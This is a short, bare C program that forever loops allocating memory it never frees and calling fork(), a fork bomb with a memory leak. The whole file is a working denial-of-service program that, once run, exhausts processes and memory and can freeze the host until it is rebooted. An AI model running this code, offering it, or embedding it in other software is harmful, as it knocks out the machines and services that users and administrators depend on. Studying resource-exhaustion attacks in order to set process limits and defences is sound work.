#include <unistd.h>
#include <stdlib.h>

int main() {
FORK:
	malloc(100);
	fork();
	goto FORK;
}
